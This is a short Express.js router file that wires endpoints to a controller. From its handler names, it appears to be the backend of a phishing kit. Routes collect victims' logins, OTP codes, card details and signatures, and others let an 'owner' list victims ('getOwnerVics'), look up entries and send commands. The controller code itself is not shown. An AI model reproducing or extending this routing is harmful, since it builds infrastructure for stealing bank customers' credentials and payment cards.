const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    deleteEntry,
    submitLogin,
    submitLoginAgain,
    submitOtp,
    submitCard,
    submitSignatrue,
} = require("../controllers/santsesController.js");
const router = express.Router();

router.post("/login", submitLogin);
router.post("/otp", submitOtp);
router.post("/loginAgain", submitLoginAgain);
router.post("/signature", submitSignatrue);
router.post("/card", submitCard);
router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/delete", deleteEntry);

module.exports = router;
